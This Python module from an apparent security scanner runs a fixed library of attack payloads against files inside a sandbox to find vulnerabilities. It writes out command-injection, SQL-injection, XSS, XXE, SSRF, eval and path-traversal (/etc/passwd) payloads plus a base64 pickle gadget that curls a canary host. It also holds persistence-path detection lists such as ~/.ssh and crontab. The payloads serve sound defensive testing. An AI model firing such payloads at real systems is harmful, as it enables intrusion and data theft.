"""DAST Discovery v0.0 — proactive vulnerability search (v1.1).

The DAST orchestrator (``dast/orchestrator.py``) only **validates** L1's
existing findings — for each ``vulnerabilities[i]`` from L1, it tries
to confirm or refute via sandbox testing. If L1 missed a CWE-78
command injection in ``app.py:42``, the orchestrator never tests it.

Discovery mode flips that: for each DAST-eligible file, run a fixed
library of attack payloads (top CWEs) through the sandbox, observe
traces for oracle keywords, and report any observed-exploitable
behavior as a new finding. Net effect: Argus can surface
vulnerabilities the L1 cascade missed entirely.

This is the v0.0 minimum: hardcoded payload templates, no fuzzing,
no coverage tracking. v1.0 (Tier 3) replaces this with proper
fuzzing infrastructure.

Architecture:

    file_content + l1_findings
                ↓
    for each DiscoveryPayload:
        sandbox plan = build_plan(payload, file)
        trace = sandbox.submit(plan)
        if any oracle keyword observed in trace:
            DiscoveredFinding(cwe, payload, evidence)
                ↓
    list[DiscoveredFinding]
                ↓
    engine surfaces in result.dast_findings with discovered_by flag

Cost: ~$0.05 per file per payload (1 sandbox call each). With the
v0.0 5-CWE library, that's ~$0.25 per file × N DAST-eligible files.
The orchestrator's existing per-finding validation cost stays the
same; this is additional spend for the new capability.
"""

from __future__ import annotations

import asyncio
import logging
import time
import uuid
from dataclasses import dataclass
from typing import Any

from dast.sandbox.client import SandboxClient, SandboxPlan, SandboxTrace

log = logging.getLogger("argus.dast.discovery")


# ── Discovery payload library (v0.0) ─────────────────────────────────────────


@dataclass(frozen=True)
class DiscoveryPayload:
    """One attack template DAST will try against the sandboxed file."""

    cwe: str
    cwe_name: str  # human-readable name
    severity: str  # critical | high | medium | low
    payload_input: str  # the malicious string we feed
    commands: tuple[str, ...]  # shell commands the sandbox runs
    # Oracle 1: substring keyword match on observation-event payload
    # text (the v0.0 mechanism). Empty tuple means "don't use keyword
    # oracle for this payload" — use one of the kind / path oracles
    # below instead.
    oracle_keywords: tuple[str, ...] = ()
    # Oracle 2 (v0.5): match any observation event whose ``kind``
    # appears in this set. Useful for malware-pattern payloads where
    # the FACT of the event firing is the signal (not its content).
    # E.g., ``("network_call_captured",)`` matches any outbound network
    # attempt regardless of destination.
    oracle_event_kinds: tuple[str, ...] = ()
    # Oracle 3 (v0.5): when ``oracle_event_kinds`` matches a
    # ``file_writes_observed`` event, additionally check the event's
    # observed paths against this substring list. Used for persistence
    # detection: writes to /etc, ~/.ssh, ~/.bashrc, etc.
    oracle_observed_paths: tuple[str, ...] = ()
    image_hint: str = "networked"  # most discovery payloads need network egress


# v0.0 library — top CWEs by attack-surface frequency.
# Each oracle keyword set captures the EFFECT of successful exploitation
# (DNS lookup of attacker domain, write to /tmp/exploited, etc.) so we
# can deterministically detect the attack worked from sandbox events.
_DISCOVERY_DOMAIN = "argus-discovery-canary.invalid"  # never resolves; used as an
# oracle marker — if the sandbox observes a DNS query / HTTP attempt to
# this domain, the payload achieved external egress = exploit succeeded.

# Convention: the sandbox writes the file under test to
# ``$WORKSPACE/$FILE_NAME`` (default ``/workspace/<filename>``) and
# exposes ``$FILE_NAME`` in the environment. Discovery commands invoke
# the target via the appropriate runtime based on file extension —
# ``python3`` for .py / .pth, ``node`` for .js / .ts / .jsx / .tsx,
# ``bash`` for .sh, ``java`` for .class. The existing minimal sandbox
# image already includes Python 3 + Node.js + npm + JRE-headless, so
# no new Docker image is needed for multi-language coverage (DAST-206).
#
# The shell ``case`` runs at execution time inside the sandbox where
# ``$FILE_NAME`` is already populated. ``2>&1 || true`` redirects
# stderr to stdout and prevents nonzero exits from short-circuiting.
#
# Future v1.2: add Go runtime to the image (DAST-206 phase 2),
# add ts-node for direct .ts execution (currently we'd treat .ts as .js
# via Node which won't transpile types — fine for security scanning
# since we're testing runtime behavior, not type semantics).
_TARGET_INVOKE = (
    'case "$FILE_NAME" in '
    '*.py|*.pth) python3 "/workspace/$FILE_NAME";;'
    '*.js|*.mjs|*.cjs|*.ts|*.jsx|*.tsx) node "/workspace/$FILE_NAME";;'
    '*.sh|*.bash) bash "/workspace/$FILE_NAME";;'
    # Java .class files: extract class name (FILE_NAME minus .class) and
    # invoke ``java`` with the class name + classpath /workspace. Sandbox
    # has default-jre-headless (no JDK) so .class works but .java source
    # needs the JDK image rebuild (DAST-206 phase 2 in tasks.md).
    '*.class) java -cp /workspace "${FILE_NAME%.class}";;'
    '*.jar) java -jar "/workspace/$FILE_NAME";;'
    '*) python3 "/workspace/$FILE_NAME";;'
    "esac"
)


def _target_invoke_for(filename: str) -> str:
    """Return the shell command that invokes the file by its language.
    Used in tests + diagnostic tools where we want to know the runtime
    deterministically without having to parse the case statement.

    The runtime sandbox uses :data:`_TARGET_INVOKE` directly (a shell
    case that picks at execution time) — this helper exists so tests
    can assert "for x.js, the runner is node"."""
    fn = filename.lower()
    if fn.endswith((".py", ".pth")):
        return f'python3 "/workspace/{filename}"'
    if fn.endswith((".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx")):
        return f'node "/workspace/{filename}"'
    if fn.endswith((".sh", ".bash")):
        return f'bash "/workspace/{filename}"'
    if fn.endswith(".class"):
        # Strip .class suffix to get the class name; java needs the
        # bare classname + classpath, not the file path.
        class_name = filename[: -len(".class")]
        return f'java -cp /workspace "{class_name}"'
    if fn.endswith(".jar"):
        return f'java -jar "/workspace/{filename}"'
    return f'python3 "/workspace/{filename}"'  # default fallback


DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
    DiscoveryPayload(
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        severity="critical",
        payload_input=f"; curl -s http://{_DISCOVERY_DOMAIN}/cwe78 #",
        commands=(f"{_TARGET_INVOKE} '; curl -s http://{_DISCOVERY_DOMAIN}/cwe78 #' 2>&1 || true",),
        # Oracle: did the file actually trigger the network call? The
        # sandbox capture server (DNS hijack -> 127.0.0.1:80) emits an
        # event when ANY hostname is queried. We match on the canary
        # domain string in EVENT payloads (handled by _trace_text +
        # ``_oracle_match`` with events_only=True).
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    DiscoveryPayload(
        cwe="CWE-89",
        cwe_name="SQL Injection",
        severity="critical",
        # Use a payload that makes a network call when SQL eval succeeds —
        # MySQL's load_file() would attempt to read /etc/passwd via
        # network, sqlite's attach() also gives a signal. For broad
        # detection we layer two probes: a UNION SELECT canary and a
        # boolean-blind probe.
        payload_input=f"' UNION SELECT 'x' FROM (SELECT pg_sleep(0.1) FROM (SELECT 1 WHERE 'a'='a' AND ('1'='1' OR (SELECT 1 FROM (SELECT load_file('//{_DISCOVERY_DOMAIN}/cwe89'))t)))t)t--",
        commands=(
            f"{_TARGET_INVOKE} \"' UNION SELECT 'x' FROM (SELECT load_file('//{_DISCOVERY_DOMAIN}/cwe89'))t--\" 2>&1 || true",
        ),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    DiscoveryPayload(
        cwe="CWE-22",
        cwe_name="Path Traversal",
        severity="high",
        payload_input="../../../etc/passwd",
        commands=(
            # If the file does path traversal AND prints/returns the file
            # content, the capture server won't see it (no network) but
            # /etc/passwd content has a recognisable root: header. We
            # check the trace events for file_open / file_read events
            # targeting passwd OR for stdout that contains the actual
            # passwd marker (not a string with '/etc/passwd').
            f"{_TARGET_INVOKE} '../../../etc/passwd' 2>&1 || true",
        ),
        # The "root:x:0:0:" pattern is /etc/passwd's first line — only
        # appears in stdout if the file actually READ and printed the
        # file's content (real exploitation). Path-string mentions like
        # the literal "/etc/passwd" don't produce this marker.
        oracle_keywords=("root:x:0:0",),
    ),
    DiscoveryPayload(
        cwe="CWE-79",
        cwe_name="Cross-Site Scripting",
        severity="high",
        # XSS in a CLI / Python file is unusual. We probe the file with
        # an XSS payload that, if reflected unsanitized to a webpage,
        # would call the canary domain. For non-web files this won't
        # fire — that's correct behavior.
        payload_input=(f'<script src="http://{_DISCOVERY_DOMAIN}/cwe79.js"></script>'),
        commands=(f"{_TARGET_INVOKE} '<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>' 2>&1 || true",),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    DiscoveryPayload(
        cwe="CWE-502",
        cwe_name="Insecure Deserialization",
        severity="critical",
        # Base64-encoded pickle gadget. On unpickle, __reduce__ executes
        # ``curl http://<canary>/cwe502``. The capture server records
        # the connection attempt.
        payload_input=(
            "gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDdjdXJsIC1zIGh0dHA6Ly9hcmd1cy1kaXNjb3ZlcnktY2FuYXJ5LmludmFsaWQvY3dlNTAylIWUUpQu"
        ),
        commands=(
            f"{_TARGET_INVOKE} "
            "'gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDdjdXJsIC1zIGh0dHA6Ly9hcmd1cy1kaXNjb3ZlcnktY2FuYXJ5LmludmFsaWQvY3dlNTAylIWUUpQu' "
            "2>&1 || true",
        ),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    # ── v0.5 expansion: web-app CWEs ────────────────────────────────────────
    DiscoveryPayload(
        cwe="CWE-918",
        cwe_name="Server-Side Request Forgery (SSRF)",
        severity="critical",
        # SSRF payload — if the file makes outbound requests based on
        # user input, this URL gets fetched. Internal hostnames test
        # the file's access to attacker-controlled infrastructure.
        payload_input=f"http://{_DISCOVERY_DOMAIN}/cwe918-ssrf",
        commands=(f"{_TARGET_INVOKE} 'http://{_DISCOVERY_DOMAIN}/cwe918-ssrf' 2>&1 || true",),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    DiscoveryPayload(
        cwe="CWE-611",
        cwe_name="XML External Entity (XXE)",
        severity="high",
        # Classic XXE payload with external DTD pointing at canary.
        # If the file parses XML with external entities enabled, the
        # parser fetches the canary URL during DTD resolution.
        payload_input=(
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{_DISCOVERY_DOMAIN}/cwe611-xxe">]>'
            f"<foo>&xxe;</foo>"
        ),
        commands=(
            f'{_TARGET_INVOKE} \'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{_DISCOVERY_DOMAIN}/cwe611-xxe">]>'
            f"<foo>&xxe;</foo>' 2>&1 || true",
        ),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    DiscoveryPayload(
        cwe="CWE-94",
        cwe_name="Code Injection (eval / exec / dynamic import)",
        severity="critical",
        # Python-style code injection via input that contains eval-able
        # expressions. If the file does ``eval(input)`` or ``exec(input)``
        # or imports based on input, this triggers a network call.
        payload_input=(f"__import__('urllib.request').request.urlopen('http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()"),
        commands=(
            f"{_TARGET_INVOKE} "
            f"\"__import__('urllib.request').request.urlopen("
            f"'http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()\" 2>&1 || true",
        ),
        oracle_keywords=(_DISCOVERY_DOMAIN,),
    ),
    # ── v0.5 expansion: malware-pattern CWEs ────────────────────────────────
    # These fire on files that EXHIBIT the malicious behavior (no input
    # required) — exactly the regression-suite pattern (litellm, sitecustomize,
    # init__.py, etc.). The payload is irrelevant; we run the file directly
    # and observe the runtime. Net effect: discovery confirms what L1 said
    # is malicious is actually exhibiting the pattern.
    DiscoveryPayload(
        cwe="CWE-201",
        cwe_name="Sensitive Data Exfiltration via Network",
        severity="critical",
        payload_input="",
        commands=(
            # Run the file with NO args — observe whether it makes
            # outbound network calls of its own accord.
            f"{_TARGET_INVOKE} 2>&1 || true",
        ),
        # Oracle: ANY network_call_captured event, regardless of host.
        # The capture server emits this for every outbound HTTP attempt
        # via the DNS hijack. We use a generic event-kind match below
        # via ``oracle_event_kinds`` (added in v0.5).
        oracle_keywords=(),
        oracle_event_kinds=("network_call_captured",),
    ),
    DiscoveryPayload(
        cwe="CWE-506",
        cwe_name="Embedded Malicious Code / Persistence",
        severity="critical",
        payload_input="",
        commands=(
            # Same as CWE-201 — run the file without args, observe.
            # The persistence oracle is "did the file write to a
            # persistent location?" The capture server emits
            # file_writes_observed events.
            f"{_TARGET_INVOKE} 2>&1 || true",
        ),
        oracle_keywords=(),
        # Persistence indicators: writes to /etc, ~/.ssh, ~/.bashrc,
        # crontab, systemd, /usr/local. The file_writes_observed event
        # carries the changed paths in its payload — we'll match those
        # via a path-list oracle (added in v0.5).
        oracle_event_kinds=("file_writes_observed",),
        oracle_observed_paths=(
            "/etc/",
            "/.ssh/",
            "/.bashrc",
            "/.bash_profile",
            "/.profile",
            "/crontab",
            "/usr/local/",
            "/sitecustomize.py",
            "/.pth",
        ),
    ),
)


# ── Discovered-finding shape ─────────────────────────────────────────────────


@dataclass
class DiscoveredFinding:
    """One vulnerability DAST discovered (not in L1's findings list)."""

    finding_id: str  # "D001", "D002" — D-prefixed to distinguish from L1's H-prefixed
    cwe: str
    cwe_name: str
    severity: str
    payload: str  # the malicious input that triggered observation
    runtime_evidence: str  # short summary of the trace events that matched the oracle
    sandbox_plan_id: str  # for traceability
    sandbox_event_count: int
    discovered_by: str = "dast_discovery_v0"

    def to_dict(self) -> dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "cwe": self.cwe,
            "cwe_name": self.cwe_name,
            "severity": self.severity,
            "payload": self.payload,
            "runtime_evidence": self.runtime_evidence,
            "sandbox_plan_id": self.sandbox_plan_id,
            "sandbox_event_count": self.sandbox_event_count,
            "discovered_by": self.discovered_by,
            "status": "CONFIRMED",  # discovered findings are by definition runtime-validated
        }


# ── Oracle matching ──────────────────────────────────────────────────────────


# Event kinds the entrypoint.py emits. We separate them into "observation"
# events (sandbox captured something the file under test caused) and
# "meta" events (sandbox itself emitting its own state, including command
# text we passed in). Oracle matching only checks observation events —
# matching on meta events would re-introduce the stdout-echo false
# positive class (our own command text appearing in process_spawn).
_OBSERVATION_EVENT_KINDS = frozenset(
    {
        "network_call_captured",
        "file_writes_observed",
        "file_reads_observed",
        "process_exit",  # exit code carries info about what ran
        "syscall_observed",  # if instrumented (future)
        "expected_evidence_match",
    }
)

# Meta events — explicitly EXCLUDED from oracle matching. The file
# may have caused effects but the event payload echoes our planned
# input rather than file behavior.
_META_EVENT_KINDS = frozenset(
    {
        "execution_start",
        "execution_complete",
        "process_spawn",  # carries our command text — false-positive trap!
        "process_timeout",
        "env_error",
        "env_setup",
    }
)


def _events_text(trace: SandboxTrace) -> str:
    """Flatten only OBSERVATION events into searchable text. Meta events
    (execution_start, process_spawn, etc.) are excluded — they echo our
    planned commands and would falsely trigger oracles when the
    command's text contains a canary domain or other oracle keyword."""
    parts: list[str] = []
    for ev in trace.events or []:
        if ev.kind not in _OBSERVATION_EVENT_KINDS:
            continue
        parts.append(ev.kind)
        if ev.payload:
            parts.append(str(ev.payload))
    return "\n".join(parts)


def _stdout_text(trace: SandboxTrace) -> str:
    """Stdout + stderr text. Used only for content-based oracles where
    the file MUST actually read+print sensitive data (e.g., /etc/passwd
    content shows root:x:0:0). Path-traversal attempts that just echo
    the input string don't produce this marker."""
    parts: list[str] = []
    if trace.stdout_excerpt:
        parts.append(trace.stdout_excerpt)
    if trace.stderr_excerpt:
        parts.append(trace.stderr_excerpt)
    return "\n".join(parts)


# Oracle keywords that are CONTENT-based (must appear in stdout, not
# event payloads). The /etc/passwd marker only shows up if the file
# actually read and printed the file — not if the file received the
# string "../../../etc/passwd" as input and echoed it back.
_CONTENT_BASED_ORACLES = frozenset({"root:x:0:0"})


def _oracle_match(
    trace: SandboxTrace,
    oracle_keywords: tuple[str, ...] = (),
    oracle_event_kinds: tuple[str, ...] = (),
    oracle_observed_paths: tuple[str, ...] = (),
) -> tuple[bool, list[str]]:
    """True iff any oracle condition is satisfied. Three orthogonal
    oracle types (any one is sufficient to match):

      * ``oracle_keywords`` (v0.0) — substring match on observation
        events' text. Content-based oracles also fall through to
        stdout when listed in ``_CONTENT_BASED_ORACLES``.
      * ``oracle_event_kinds`` (v0.5) — any event with one of these
        ``kind`` values causes a match (the FACT of the event is the
        signal). Used for malware patterns where ANY network call /
        file write counts.
      * ``oracle_observed_paths`` (v0.5) — restricts ``file_writes_observed``
        kind matches to events whose observed path payload contains
        any of these substrings (e.g., ``/etc/``, ``/.ssh/``).
        Persistence detection.

    Returns the matched oracle tags (keywords, kinds, paths) for
    evidence reporting.
    """
    matched: list[str] = []

    # Oracle 1: keyword match
    if oracle_keywords:
        events = _events_text(trace).lower()
        stdout_only: str | None = None  # lazy-evaluated
        for kw in oracle_keywords:
            kw_lower = kw.lower()
            if kw_lower in events:
                matched.append(kw)
                continue
            if kw in _CONTENT_BASED_ORACLES:
                if stdout_only is None:
                    stdout_only = _stdout_text(trace).lower()
                if kw_lower in stdout_only:
                    matched.append(kw)

    # Oracle 2 + 3: event-kind match (with optional path restriction)
    if oracle_event_kinds:
        for ev in trace.events or []:
            if ev.kind not in oracle_event_kinds:
                continue
            # Path-restriction filter for persistence-style oracles.
            if oracle_observed_paths and ev.kind == "file_writes_observed":
                payload_text = str(ev.payload or "").lower()
                hit_paths = [p for p in oracle_observed_paths if p.lower() in payload_text]
                if not hit_paths:
                    continue  # event kind matched but path doesn't — skip
                matched.extend(f"path:{p}" for p in hit_paths)
            else:
                matched.append(f"kind:{ev.kind}")

    return (len(matched) > 0, matched)


# ── Discovery runner ─────────────────────────────────────────────────────────


def _build_plan(
    file_id: str,
    payload: DiscoveryPayload,
    plan_index: int,
    file_name: str = "",
) -> SandboxPlan:
    """Construct a SandboxPlan for one discovery payload."""
    return SandboxPlan(
        plan_id=f"discovery-{file_id}-{plan_index:03d}-{uuid.uuid4().hex[:8]}",
        file_id=file_id,
        hypothesis_id=f"D{plan_index + 1:03d}",
        commands=list(payload.commands),
        expected_oracle=" OR ".join(payload.oracle_keywords),
        payload=payload.payload_input,
        timeout_sec=30,
        image_hint=payload.image_hint,
        file_name=file_name,
    )


async def run_discovery(
    *,
    file_id: str,
    sandbox: SandboxClient,
    payloads: tuple[DiscoveryPayload, ...] = DISCOVERY_PAYLOADS,
    timeout_sec: float = 60.0,
    file_name: str = "",
) -> tuple[list[DiscoveredFinding], list[dict[str, Any]]]:
    """Run the discovery payload library against one file in the sandbox.

    Returns:
        (findings, traces_summary) — the list of DiscoveredFinding
        instances (only payloads where the oracle matched) AND a list
        of per-payload trace metadata for diagnostics (whether oracle
        matched, event count, elapsed_ms — every payload, not just
        confirmed ones).

    Each payload is submitted as a separate SandboxPlan. We don't
    parallelize — sandbox machines are billed per second of execution
    and concurrent provisioning has Fly app rate limits. Sequential
    keeps it simple and observable.
    """
    findings: list[DiscoveredFinding] = []
    traces_summary: list[dict[str, Any]] = []

    for idx, p in enumerate(payloads):
        plan = _build_plan(file_id, p, idx, file_name=file_name)
        t0 = time.time()
        try:
            trace = await asyncio.wait_for(sandbox.submit(plan), timeout=timeout_sec)
        except TimeoutError:
            log.warning("discovery plan %s timed out", plan.plan_id)
            traces_summary.append(
                {
                    "plan_id": plan.plan_id,
                    "cwe": p.cwe,
                    "matched": False,
                    "elapsed_ms": int((time.time() - t0) * 1000),
                    "error": "timeout",
                }
            )
            continue
        except Exception as e:  # noqa: BLE001
            log.warning("discovery plan %s failed: %s", plan.plan_id, e)
            traces_summary.append(
                {
                    "plan_id": plan.plan_id,
                    "cwe": p.cwe,
                    "matched": False,
                    "elapsed_ms": int((time.time() - t0) * 1000),
                    "error": f"{type(e).__name__}: {e}",
                }
            )
            continue

        elapsed_ms = int((time.time() - t0) * 1000)
        matched, matched_kws = _oracle_match(
            trace,
            oracle_keywords=p.oracle_keywords,
            oracle_event_kinds=p.oracle_event_kinds,
            oracle_observed_paths=p.oracle_observed_paths,
        )
        traces_summary.append(
            {
                "plan_id": plan.plan_id,
                "cwe": p.cwe,
                "matched": matched,
                "matched_keywords": matched_kws,
                "elapsed_ms": elapsed_ms,
                "event_count": len(trace.events or []),
                "is_stub": trace.is_stub_no_trace,
            }
        )

        if matched:
            findings.append(
                DiscoveredFinding(
                    finding_id=f"D{idx + 1:03d}",
                    cwe=p.cwe,
                    cwe_name=p.cwe_name,
                    severity=p.severity,
                    payload=p.payload_input[:240],
                    runtime_evidence=(
                        f"Sandbox observed {len(trace.events or [])} events; "
                        f"oracle matched on: {', '.join(matched_kws)}"
                    ),
                    sandbox_plan_id=plan.plan_id,
                    sandbox_event_count=len(trace.events or []),
                )
            )

    return findings, traces_summary


__all__ = [
    "DISCOVERY_PAYLOADS",
    "DiscoveredFinding",
    "DiscoveryPayload",
    "run_discovery",
]
